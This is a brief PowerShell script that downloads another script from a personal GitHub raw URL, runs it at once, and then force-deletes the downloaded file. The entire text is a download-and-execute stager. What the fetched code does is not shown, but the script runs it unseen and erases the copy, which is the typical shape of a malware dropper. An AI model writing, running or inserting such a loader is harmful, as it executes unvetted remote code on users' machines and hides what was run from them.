$scriptPath = "$PSScriptRoot\temp_2.ps1"
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/truongcp0305/dp/main/2.ps1" -OutFile $scriptPath

& $scriptPath

Remove-Item $scriptPath -Force